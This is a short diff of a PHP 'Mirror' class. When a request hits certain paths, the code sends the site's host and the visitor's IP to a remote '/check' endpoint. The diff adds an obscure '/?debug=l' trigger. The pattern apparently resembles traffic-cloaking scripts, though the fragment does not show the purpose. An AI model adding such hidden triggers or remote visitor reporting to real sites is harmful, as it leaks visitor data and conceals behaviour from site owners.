@@ -43,7 +43,7 @@ Class Mirror
     {
         $ip = self::getIP();
         if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
-            if ($_SERVER['REQUEST_URI'] == '/' || stripos($_SERVER['REQUEST_URI'], '/?source=') !== false) {
+            if ($_SERVER['REQUEST_URI'] == '/' || stripos($_SERVER['REQUEST_URI'], '/?source=') !== false || $_SERVER['REQUEST_URI'] == '/?debug=l') {
                 try {
                     $url = $this->server . "/check?host=" . $_SERVER['HTTP_HOST'] . '&ip=' . $ip;
 
